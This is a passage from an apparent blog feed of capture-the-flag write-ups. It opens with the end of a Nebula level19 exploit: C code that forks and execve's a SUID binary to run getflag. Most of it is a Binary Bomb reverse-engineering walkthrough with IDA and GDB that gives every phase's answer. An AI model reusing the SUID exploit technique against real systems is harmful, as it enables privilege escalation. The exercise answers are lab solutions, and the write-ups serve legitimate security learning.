     <span class="k">if</span><span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
         <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
         <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
         <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"/bin/getflag"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
         <span class="n">execve</span><span class="p">(</span><span class="s">"/home/flag19/flag19"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>Compile this file with <code class="language-plaintext highlighter-rouge">gcc /tmp/flag19.c -o /tmp/flag19</code>`, give it execution permissions if needed, and run it.</li>
  <li>The parent process will die upon spawn of the child, which in turn will have UID == 0 and therefore pass the check and be allowed to enter the original <code class="language-plaintext highlighter-rouge">execve</code> in the /home/flag19/flag19 program. This will execute <code class="language-plaintext highlighter-rouge">getflag</code> for us.</li>
</ol>]]></content><author><name>P2</name></author><category term="CTF" /><summary type="html"><![CDATA[CTF by Andrew Griffiths @ https://exploit.education/nebula/ This Capture the Flag introduces sysadmin Linux concepts. There will be SUID fils, permissions, race conditions and other topics. I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics.]]></summary></entry><entry><title type="html">Binary Bomb</title><link href="http://localhost:4000/ctf/2023/11/04/Binary-Bomb.html" rel="alternate" type="text/html" title="Binary Bomb" /><published>2023-11-04T00:00:00+01:00</published><updated>2023-11-04T00:00:00+01:00</updated><id>http://localhost:4000/ctf/2023/11/04/Binary-Bomb</id><content type="html" xml:base="http://localhost:4000/ctf/2023/11/04/Binary-Bomb.html"><![CDATA[<p><img src="https://cdn.pixabay.com/photo/2017/06/14/15/22/bomb-2402460_1280.png" alt="center-aligned-image" class="align-center" /></p>

<p class="notice--info">Example BBs by <strong>Luong Vo</strong> @ <a href="https://github.com/luong-komorebi/Binary-Bomb">https://github.com/luong-komorebi/Binary-Bomb</a></p>

<p>This binary bomb was an assignment I was given years ago during my computer architecture and system programming course at university. I remember at the time I had absolutely no idea how to go at it, I had no clue how to read assembly and I had never ever used gdb before. Needless to say, I was not able to solve it. Like, not even remotely. <br />
So while a friend of mine was following the same course and had access to the material, I asked him to forward me the challenge, as I wanted to try my hand at it again. First of all because I finally have more or less an understanding of how these things work, and secondly because I wanted to play around with IDA and gdb. <br />
I can’t provide the exact files I worked on, but a lot of repositories offer similar challenges, for example the one linked above.</p>

<!--more-->

<table>
  <thead>
    <tr>
      <th>Content:</th>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="#install">Install</a></td>
      <td><a href="#phase-01">Phase 1</a></td>
      <td><a href="#secret-phase">Secret Phase</a></td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#phase-02">Phase 2</a></td>
      <td> </td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#phase-03">Phase 3</a></td>
      <td> </td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#phase-04">Phase 4</a></td>
      <td> </td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#phase-05">Phase 5</a></td>
      <td> </td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td> </td>
      <td><a href="#phase-06">Phase 6</a></td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h1 id="capture-the-flag">Capture the Flag</h1>

<h3 id="install">[Install]</h3>
<p>The challenge itself is an executable C file, compiled for Linux x64. It will run just by calling it from the terminal, meaning ``./bomb` <br />
To analyze what is going on, we will use the free version of IDA: IDA will give us a nice overview of the code and especially of the code flow. The free version does not give the possibility of doing dynamic analysis, but in case you have the complete version feel free to use it to go through the entire project (udate: great news, IDA Free now can do debugging!!!). To load the project into IDA it is enough to drag and drop the executable over the IDA icon, and the software will start and do all the analysis automatically.</p>

<p>For the dynamic analysis, we will use GDB (should be preinstalled in Linux, otherwise get it with <code class="language-plaintext highlighter-rouge">sudo apt install gdb</code>) and we will expand it with the great GDB dashboard that you can download from <a href="https://github.com/cyrus-and/gdb-dashboard">this repo by Andrea Cardaci</a>. The dashboard will work just by putting the provided .gdbinit file in your home folder. To pipe GDB data into it you have to do the following:</p>
<ol>
  <li>Start GDB in one terminal</li>
  <li>In another terminal run the tty command and copy the result (e.g. /dev/ttys001). Leave this terminal open, as it is where GDB will pipe the data</li>
  <li>In the GDB terminal issue the command dashboard -output /dev/ttys001 (with your tty result)</li>
  <li>Debug as usual, magic will happen in the second terminal</li>
</ol>

<p>If you are as newbie in GDB as me, here are the commands that I found most useful:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>gdb executable_name</td>
      <td>Launch the debugger with the given executable</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>gdb –args executable_name parameters</td>
      <td>Launch the debugger with the given executable and pass the given parameters to the executable</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>run</td>
      <td>Start or restart the execution of the program</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>c</td>
      <td>Continue execution until the next breakpoint</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>ni</td>
      <td>Go to the next assembly instruction (step over functions)</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>si</td>
      <td>Go to the next assembly instruction (step in functions)</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>fin</td>
      <td>Run unti return of current function</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>break [*0xYYYYYYYY || func_name]</td>
      <td>Set a breakpoint to the given address or function</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>i b</td>
      <td>Infos on existing breakpoints</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>delete Y</td>
      <td>Delete breakpoint number Y</td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td>x/Yx [d || w || …] [$reg_name || 0xYYYYYYYY]</td>
      <td>Show Y elements as double/word/… from the given register or address</td>
    </tr>
  </tbody>
</table>

<p>As a last detail, the version of the bomb that I used accepted as a parameter a file containing the already found keys, one per line. This makes it easier to reach the current point of the analysis without having to retype all the keys after every restart.</p>

<h3 id="phase-01">[Phase 01]</h3>
<p><strong>String comparison.</strong> <br />
This phase is really short and does not require the use of GDB as IDA does all the needed work for us.</p>

<p><img src="/images/binarybomb/phase1.png" alt="center-aligned-image" class="align-center" /></p>

<p>The only thing that happens in the phase is loading a register with the address of a string, and invoke a method called strings_not_equal. It is easy to guess what that method does, and we can see the we will reach the end of the phase without exploding if the return value of that method is 0. Therefore we can assume that the key we are looking for is the one that is passed as argument. In IDA, you can double click on it to reach its address, and copy the entire string from there.</p>

<h3 id="phase-02">[Phase 02]</h3>
<p><strong>Looping.</strong> <br />
This phase is pretty clear on what is the format of the expected output, as it reads it invoking a method called read_six_numbers. <br />
It gets slightly trickier when it comes to analyze how those six integers are analyzed, because it happens in a loop where each element depends from the previous one.</p>

<p><img src="/images/binarybomb/phase2.png" alt="center-aligned-image" class="align-center" /></p>

<p>The loop iterates over $ebx, which is initialized to 1 before the loop and is incremented one by one until it reaches the value 6, at that point the loop is over. This hints on the fact that the loop will check every element of the input. <br />
What decides if the bomb explodes or not is the following line: <code class="language-plaintext highlighter-rouge">cmp [rbp+4], eax</code>. In assembly, cmp subtracts the second operand from the first and just sets the flags without storing the result of the operation. It means that if the two operands are the same, the Zero Flag will be set, and this is what the following instruction is doing: go on with the next iteration of the loop only if $eax and [rbp+4] contain the same value. <br />
It helps going through the loop a couple of times using gdb and looking what is stored in $eax and in $rbp: to do that you can reach the compare instruction and then look at the registers with <code class="language-plaintext highlighter-rouge">x/x $rbp</code>, <code class="language-plaintext highlighter-rouge">x/x $rbp+4</code> and <code class="language-plaintext highlighter-rouge">x/x $eax</code>. You will see that $rbp contains the current input element, and $rbp+4 the following one, while $eax contains another value to which our input should correspond to defuse the bomb. <br />
Let’s analyze the loop: in each iteration $eax is initialized to the current iteration value, then it has added the value of the current input, and that should correspond to the value of the next input. If the comparison is passed, our counter is incremented and so is the pointer to the current input. The corresponding pseudocode is the following one:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">eax</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">rbp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mf">1.</span><span class="p">.</span><span class="mi">5</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">eax</span> <span class="o">!=</span> <span class="n">rbp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="n">explode</span>
    <span class="n">eax</span> <span class="o">=</span> <span class="n">eax</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</code></pre></div></div>

<p>To get the key, start with a random value as rbp[0] and work through the loop to get the following 5 elements needed to pass this phase. An example of a working sequence is 61 ; 62 ; 64 ; 67 ; 71 ; 76.</p>

<h3 id="phase-03">[Phase 03]</h3>
<p><strong>Switch Statement</strong> <br />
Here is when IDA starts getting really useful, thanks to all the data that it extracts during its initial analysis and inserts exactly where we need it. An example is for the input of this function: the bomb uses a library function (sscanf), that we can look up on msdn to discover that it takes a pointer to a buffer and a pointer to a format as parameters. IDA provides us with the format, that is stored as a string: %d %c %d. Looking up the string formatting in C, we see that this corresponds to an integer, a char and an integer again.</p>

<p><img src="/images/binarybomb/phase3_1.png" alt="center-aligned-image" class="align-center" /></p>

<p>If the format of the input is respected, the next instruction checks the first input. We know it’s the input because that’s the pointer to the buffer that we passed to the sscanf method, and we know it’s the first one because we can look into it with GDB using <code class="language-plaintext highlighter-rouge">x/4x $rsp+0x28-0x18</code>. This value should be &lt;= 7, to cover the switch cases. If it is larger, it will fall directly to the default case, making the bomb explode.</p>

<p><img src="/images/binarybomb/phase3_2.png" alt="center-aligned-image" class="align-center" /></p>

<p>Thanks to IDA we know that we are going through a switch clause (jumping to different branches with the instruction <code class="language-plaintext highlighter-rouge">jmp ds:off_402620[rax*8]</code>), and we can look into each branch. The branches all have the same structure: moving a value into $eax, comparing a value to a memory location and if the result sets the zero flag (meaning the values are the same) jumping to another comparision of the lowest bits of $eax. The memory location that we compare is also a buffer that we passed to sscanf, and it is where our second integer is stored (quickly confirmed with GDB <code class="language-plaintext highlighter-rouge">x/4x $rsp+0x28-0x14</code>). The value loaded into $eax is an ASCII value, and that should correspond to our char input. <br />
To pass this phase, it is enough to go through the 8 branches of the switch clause (well, picking one is enough), and using as input the number of that branch and the char and number defined in that same branch. In case of laziness, here is the complete table:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>branch    hex   char    hex     int
  0       0x71   	q    	0x2B1 	689
  1      	0x67   	g    	0x1BF 	447
  2      	0x61   	a    	0x15B 	347
  3      	0x66   	f    	0x2EF 	751
  4      	0x71   	q    	0x2D4 	724
  5      	0x7A   	z    	0x367 	871
  6      	0x69   	i    	0x1C9 	457
  7      	0x62   	b    	0x213 	531
</code></pre></div></div>

<h3 id="phase-04">[Phase 04]</h3>
<p><strong>Recursion</strong> <br />
The phase requires an input made by two numbers, as indicated by the “%d %d” in the parameter passed to sscanf (this can be seen with IDA). The second number passed is the first one checked (look at $eax with GDB), and it can only take the value 2, 3 or 4.</p>

<p><img src="/images/binarybomb/phase4.png" alt="center-aligned-image" class="align-center" /></p>

<p>If this check is passed, the executable goes on to run func4, which is a recursive method. I honestly have no clue what the method does , but after running some tests with GDB, it is clear that it always returns the same values depending on the input. This means that with input 2 the output is 40, with input 3 it is 60 and with input 4 it is 80. This output is the first value that you want to pass to defuse the bomb.</p>

<h3 id="phase-05">[Phase 05]</h3>
<p><strong>Array</strong> <br />
This phase requires a string of length 6, judging by the method that is invoked to check the input. Then there is a loop, and we can assume we are looping over each element of the input. Somehow, these elements are used to build a value in $ecx that has to correspond to 0x32 (== 50) after the loop ends in order to defuse the bomb.</p>

<p><img src="/images/binarybomb/phase5_1.png" alt="center-aligned-image" class="align-center" /></p>

<p>The value in $ecx is built by repeatedly adding to itself a value of an array stored in memory. Which value is picked depends on current char of our input.</p>

<p><img src="/images/binarybomb/phase5_2.png" alt="center-aligned-image" class="align-center" /></p>

<p>The values of the array are the ones reported in the figure. To defuse the bomb, we have to pick 6 values that summed give 50. The trick is that these values are picked as their index in the array, and the index is given by the lowest byte of the ASCII representation of the current char. This index is obtained by moving the input to $edx (which is the lowest part of $rdx, used later to access the array) and masking out everything apart from the lowest byte, ensuring that the value will be between 0x0 and 0xF. A way to get the correct sum is 10 + 10 + 10 + 10 + 1 + 9, which corresponds to the string ‘aaaacf’.</p>

<h3 id="phase-06">[Phase 06]</h3>
<p><strong>Linked List</strong> <br />
Input of this phase is 6 numbers, assuming that we trust the name of the method that reads in data. The input is then run through a tricky loop: the first part just checks that the given numbers are between 1 and 6, exploding the bomb for any other value. The second part is making sure that the numbers do not repeat themselves in the input, and I realized this just by running through the loop multiple times with test values and seeing what was the behavior. <br />
When all the checks are passed successfully, we move on to actually using the input. IDA makes it clear that we are accessing a structure in memory at a fix offset, and we can look at it with GDB:</p>

<p><img src="/images/binarybomb/phase6_1.png" alt="center-aligned-image" class="align-center" /></p>

<p>The structure is a linked list that contains a value, an index and the address of the next element. The problem is now to understand how this object is used. Let’s start by saying that the current input is stored in $ecx. We iterate over the input until we find the position of value 1 in the input (in this case, it will be in fifth position to indicate the fifth node). There is a lot of stuff going on with the node (again, if you know what it is please let me know), but the next important instructions for us are <code class="language-plaintext highlighter-rouge">cmp [rbx], eax; jle loc_401248</code></p>

<p><img src="/images/binarybomb/phase6_2.png" alt="center-aligned-image" class="align-center" /></p>

<p>Among another bunch of stuff, what is happening here is that we are comparing the value of the node we gave as input with another value of those nodes, and we will do this with all nodes. It takes some iterations with GDB to see that the nodes we are comparing with the ones given by our input are in increasing order. This means that we have to give as input the order of nodes from the smallest to the highest. The sequence is the following: 5 ; 3 ; 6 ; 1 ; 2 ; 4</p>

<h3 id="secret-phase">[Secret Phase]</h3>
<p><strong>Double Linked List + Recursion</strong> <br />
By exporting the strings of the bomb (for example with the command <code class="language-plaintext highlighter-rouge">strings bomb</code>) or by looking at the functions recognized by IDA, we can see that there is a secret phase method. By doing a cross reference with IDA we identify the caller of the <code class="language-plaintext highlighter-rouge">secret_phase</code> function, which is the <code class="language-plaintext highlighter-rouge">phase_defused</code> method called after each phase of the bomb. However, to invoke this method we first need to pass the correct input to reach the calling instruction.</p>

<p><img src="/images/binarybomb/secretphase_1.png" alt="center-aligned-image" class="align-center" /></p>

<p>To access the phase we see that the program re-reads the current input expecting two numbers and a string (%d %d %s). The only phase that takes a similar input is the fourth, that accepts %d %d: it means that by adding a string to this phase we will be able to access the secret phase. What we have to add is the string “DrEvil”, as showed by IDA in the image above.</p>

<p>Finally in the secret phase itself, we have to pass an input. The input string will be casted to long with strtol, and the result will have to be smaller or equal to 0x3E8 to avoid an explosion.</p>

<p><img src="/images/binarybomb/secretphase_2.png" alt="center-aligned-image" class="align-center" /></p>

<p>After some tests and the help of GDB to check what is returned by strtol in $eax, it becomes clear that the accepted values are between 1 and 1001. This value is then used by the method fun7, which also takes a pointer to a data structure as an argument. Also we know that the value returned by the function has to be equal to 7 to successfully defuse the bomb.</p>

<p><img src="/images/binarybomb/secretphase_3.png" alt="center-aligned-image" class="align-center" /></p>

<p>This data structure is a list where each element contains a value, and two pointers to other nodes. The value is at node_address, the first pointer at node_address+8, the second pointer at node_address+16. Here is the content:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node  value   1. linked node  2. linked node
n1 	  0x24 	        n21 	          n22
n21 	0x8 	        n31 	          n32
n22 	0x32 	        n33 	          n34
n32 	0x16 	        n43 	          n44
n33 	0x2D 	        n45 	          n46
n31 	0x6 	        n41 	          n42
n34 	0x6B 	        n47 	          n48
n45 	0x28 	        - 	            -
n41 	0x1 	        - 	            -
n47 	0x63 	        - 	            -
n44 	0x23 	        - 	            -
n42 	0x7 	        - 	            -
n43 	0x14 	        - 	            -
n46 	0x2F 	        - 	            -
n48 	0x3E9 	      - 	            -
</code></pre></div></div>
<p>We enter fun7 knowing that we have to keep an eye on $eax, that will contain the return value, and on the data structure, which is pointed at by $rdi (easily checked with GDB). The function is recursive, and we can see that we have to reach the value of 7 by either using <code class="language-plaintext highlighter-rouge">add eax, eax</code> or <code class="language-plaintext highlighter-rouge">lea eax, [rax+rax+1]</code>. The second case corresponds to <code class="language-plaintext highlighter-rouge">$eax = 2*$eax + 1</code>.<br />
What we have to do is to jump along the nodes of the data structure the correct amount of times to have $eax set to the current value. Starting from n1, the input value is compared to the value of the current node and the following node is determined depending on whether the zero flag is set or not. We want to always fall on the case where our input is bigger than the node value, so that we can get to 7 by doing <code class="language-plaintext highlighter-rouge">2 * ( 2 * ( 2 * eax + 1 ) + 1 ) + 1</code>. <br />
Also we have to pay attention that our input corresponds to the value of the last node we want to visit, otherwise $eax will be screwed up. It seems that it is enough to visit three nodes to achieve the result, but running it with GDB shows that we miss one iteration. Plus, to exit the recursion our last value has to be equal to what is stored in $esi, which corresponds to the value of the last node. So with 4 jumps we have to reach n48, and leaves us with only a path: n1, n22, n34, n48. This also means that our input has to be larger than 0x24, than 0x32 and 0x6B, and also be equal to 0x3E9, which clearly means that it has to be 1001 (= 0x3E9).</p>]]></content><author><name>P2</name></author><category term="CTF" /><summary type="html"><![CDATA[Example BBs by Luong Vo @ https://github.com/luong-komorebi/Binary-Bomb This binary bomb was an assignment I was given years ago during my computer architecture and system programming course at university. I remember at the time I had absolutely no idea how to go at it, I had no clue how to read assembly and I had never ever used gdb before. Needless to say, I was not able to solve it. Like, not even remotely. So while a friend of mine was following the same course and had access to the material, I asked him to forward me the challenge, as I wanted to try my hand at it again. First of all because I finally have more or less an understanding of how these things work, and secondly because I wanted to play around with IDA and gdb. I can’t provide the exact files I worked on, but a lot of repositories offer similar challenges, for example the one linked above.]]></summary></entry></feed>